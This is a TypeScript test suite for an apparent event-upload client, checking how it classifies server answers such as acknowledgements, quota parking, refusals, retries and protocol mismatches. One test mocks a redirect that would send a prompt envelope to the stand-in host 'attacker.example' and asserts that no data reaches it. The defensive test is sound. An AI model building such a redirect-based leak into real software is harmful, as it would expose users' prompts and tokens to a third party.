/**
 * Classification through the worker: every class the transport answers is
 * produced by a real server answer — acked (incl. duplicate), reslice, parked,
 * refused per code, retry (503/429/transport/timeout), route_missing (401 with
 * the protocol header), unauthorized (401 without), protocol (409).
 */
import { describe, expect, it } from 'bun:test';
import { MEMBER_TOKEN_BYTE_QUOTA } from '@myco-server-worker/constants.js';
import { mintMemberToken } from '@myco-server-worker/auth/tokens.js';
import { CLASSIFIERS } from '@myco-server-worker/telemetry.js';
import { sha256HexOf, utf8 } from '@myco-server-worker/hash.js';
import { mintId, promptEvent, transcriptSegmentEvent, type EnvelopeContext } from '@myco/member/envelope.js';
import { MEMBER_PROTOCOL } from '@myco/member/constants.js';
import { ServerClient, type FetchLike } from '@myco/member/transport.js';
import { memberRig, tempStager } from './helpers/server.js';

const budget = { connectTimeoutMs: 2_000, requestTimeoutMs: 4_000 };
const stager = tempStager();
const ctx = (sessionId: string): EnvelopeContext => ({ agent: 'claude-code', sessionId, stage: stager.stage, version: '2.0.0-test' });

describe('ServerClient classification', () => {
  it('acked on persisted:true and on a duplicate replay; the duplicate flag is carried', async () => {
    const rig = await memberRig();
    const client = new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, rig.fetch);
    const env = promptEvent(ctx('s1'), { promptId: mintId(), text: 'hi' }).envelope;
    expect(await client.postEvent(env, budget)).toMatchObject({ class: 'acked' });
    expect(await client.postEvent(env, budget)).toMatchObject({ class: 'acked', duplicate: true });
  });

  it('reslice carries the held size on offset_gap and offset_overlap', async () => {
    const rig = await memberRig();
    const client = new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, rig.fetch);
    const first = stager.stage(utf8('first-line\n'), 'text/plain; charset=utf-8');
    expect(await client.postBlob(utf8('first-line\n'), first.sha256, first.mediaType, budget)).toMatchObject({ class: 'acked' });
    const tx = `tx_${'b'.repeat(32)}`;
    const seg0 = transcriptSegmentEvent(ctx('s2'), { transcriptId: tx, baseOffset: 0, blobSource: first }).envelope;
    const acked = await client.postEvent(seg0, budget);
    expect(acked).toMatchObject({ class: 'acked', transcript: { size: first.size, segmentCount: 1 } });
    const second = stager.stage(utf8('second\n'), 'text/plain; charset=utf-8');
    expect(await client.postBlob(utf8('second\n'), second.sha256, second.mediaType, budget)).toMatchObject({ class: 'acked' });
    expect(await client.postEvent(transcriptSegmentEvent(ctx('s2'), { transcriptId: tx, baseOffset: first.size + 5, blobSource: second }).envelope, budget))
      .toEqual({ class: 'reslice', code: 'offset_gap', heldSize: first.size });
    expect(await client.postEvent(transcriptSegmentEvent(ctx('s2'), { transcriptId: tx, baseOffset: 0, blobSource: second }).envelope, budget))
      .toEqual({ class: 'reslice', code: 'offset_overlap', heldSize: first.size });
  });

  it('parked on quota, for events and blobs', async () => {
    const rig = await memberRig();
    rig.env.sqlite.query(`UPDATE member_credentials SET bytes_written = ? WHERE id = ?`).run(MEMBER_TOKEN_BYTE_QUOTA, rig.tokenId);
    const client = new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, rig.fetch);
    expect(await client.postEvent(promptEvent(ctx('s3'), { promptId: mintId(), text: 'hi' }).envelope, budget)).toMatchObject({ class: 'parked', code: 'quota' });
    const bytes = utf8('x');
    expect(await client.postBlob(bytes, await sha256HexOf(bytes), 'text/plain', budget)).toMatchObject({ class: 'parked', code: 'quota' });
  });

  it('refused carries the server code for every other terminal refusal', async () => {
    const rig = await memberRig();
    const client = new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, rig.fetch);
    const env = promptEvent(ctx('s4'), { promptId: mintId(), text: 'hi' }).envelope;
    expect(await client.postEvent({ ...env, payload: { ...env.payload, nope: 1 } }, budget)).toMatchObject({ class: 'refused', code: 'unknown_field' });
    expect(await client.postEvent({ ...env, kind: 'made.up' as never }, budget)).toMatchObject({ class: 'refused', code: 'unknown_kind' });
    expect(await client.postEvent({ ...env, eventId: 'nope' }, budget)).toMatchObject({ class: 'refused', code: 'id_grammar' });
    expect(await client.postEvent({ ...env, payload: { promptId: mintId(), blob: 'd'.repeat(64), origin: 'user' } }, budget)).toMatchObject({ class: 'refused', code: 'blob_absent' });
    const bytes = utf8('media');
    expect(await client.postBlob(bytes, await sha256HexOf(bytes), 'nonsense', budget)).toMatchObject({ class: 'refused', code: 'media_type' });
    expect(CLASSIFIERS).toContain('unknown_field');
  });

  it('retry on 503 (schema mismatch) with retry-after, on transport failure, and on timeout', async () => {
    const rig = await memberRig();
    rig.env.sqlite.query(`UPDATE schema_meta SET value = '999' WHERE key = 'version'`).run();
    const client = new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, rig.fetch);
    const env = promptEvent(ctx('s5'), { promptId: mintId(), text: 'hi' }).envelope;
    expect(await client.postEvent(env, budget)).toMatchObject({ class: 'retry', status: 503, retryAfterMs: 60_000 });

    const throwing: FetchLike = async () => { throw new Error('ECONNREFUSED'); };
    expect(await new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, throwing).postEvent(env, budget)).toMatchObject({ class: 'retry', detail: 'ECONNREFUSED' });

    const hanging: FetchLike = (_input, init) => new Promise((_resolve, reject) => { init?.signal?.addEventListener('abort', () => reject(new Error('aborted'))); });
    const started = Date.now();
    expect(await new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, hanging).postEvent(env, { connectTimeoutMs: 50, requestTimeoutMs: 5_000 }))
      .toEqual({ class: 'retry', detail: 'timeout (connect)' });
    expect(Date.now() - started).toBeLessThan(2_000);
  });

  it('429 without the protocol header is retry flagged anonymousLimited; 429 after authentication is plain retry', async () => {
    const rig = await memberRig();
    const unknown = new ServerClient({ serverUrl: 'https://s', token: mintMemberToken(), projectId: 'proj_1' }, rig.fetch);
    const env = promptEvent(ctx('s6'), { promptId: mintId(), text: 'hi' }).envelope;
    expect(await unknown.postEvent(env, budget)).toEqual({ class: 'unauthorized', status: 401 });
    // Exhaust the source bucket: the recording limiter never refuses, so stub a refusing one for this check.
    rig.env.env.SOURCE_LIMIT = { limit: async () => ({ success: false }) };
    expect(await unknown.postEvent(env, budget)).toMatchObject({ class: 'retry', status: 429, anonymousLimited: true });
    rig.env.env.TOKEN_LIMIT = { limit: async () => ({ success: false }) };
    const member = new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, rig.fetch);
    expect(await member.postEvent(env, budget)).toMatchObject({ class: 'retry', status: 429, anonymousLimited: false });
  });

  it('401 with the protocol header is route_missing (a route this build does not serve); 409 is protocol with the window', async () => {
    const rig = await memberRig();
    const env = promptEvent(ctx('s7'), { promptId: mintId(), text: 'hi' }).envelope;
    const wrongBase = new ServerClient({ serverUrl: 'https://s/v9', token: rig.token, projectId: 'proj_1' }, rig.fetch);
    expect(await wrongBase.postEvent(env, budget)).toEqual({ class: 'route_missing', status: 401 });
    const old = new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, rig.fetch, { protocol: MEMBER_PROTOCOL + 999 });
    expect(await old.postEvent(env, budget)).toMatchObject({ class: 'protocol', serverProtocol: 1, minCompatMemberProtocol: 1 });
  });

  it('a redirect is never followed and never answers acked: the capture body reaches no other host', async () => {
    const rig = await memberRig();
    const elsewhere: Array<{ path: string; body: string }> = [];
    // A fetch that behaves the way the platform's does: it honours `redirect`,
    // following a 307 to the named host when told to, and failing when told
    // the redirect is an error. Following one would ship the whole envelope to
    // that host and read its `{persisted:true}` as this server's answer.
    const redirecting: FetchLike = async (input, init) => {
      const request = new Request(input, init);
      const url = new URL(request.url);
      if (url.host === 'attacker.example') {
        elsewhere.push({ path: url.pathname, body: await request.clone().text() });
        return new Response(JSON.stringify({ persisted: true }), { status: 200, headers: { 'content-type': 'application/json' } });
      }
      // The origin answers a redirect. A `follow` client re-sends the body to
      // the named host and returns ITS answer; an `error` client fails here.
      if (request.redirect === 'error') throw new TypeError('unexpected redirect');
      return redirecting('https://attacker.example/events', init);
    };
    const client = new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, redirecting);
    const env = promptEvent(ctx('s8'), { promptId: mintId(), text: 'secret prompt text' }).envelope;

    const outcome = await client.postEvent(env, budget);

    expect(outcome.class).toBe('retry');
    expect(elsewhere).toEqual([]);
  });

  it('refresh answers classify in the refreshed shape; health is public', async () => {
    const rig = await memberRig();
    const client = new ServerClient({ serverUrl: 'https://s', token: rig.token, projectId: 'proj_1' }, rig.fetch);
    expect(await client.refresh(budget)).toMatchObject({ class: 'refused', code: 'refresh_too_early' });
    expect((await client.refresh(budget) as { refreshAfter?: number }).refreshAfter).toBeGreaterThan(Date.now());
    expect(await client.health(budget)).toBe(true);
    expect(await new ServerClient({ serverUrl: 'https://s', token: 'x', projectId: 'p' }, async () => { throw new Error('down'); }).health(budget)).toBe(false);
  });
});
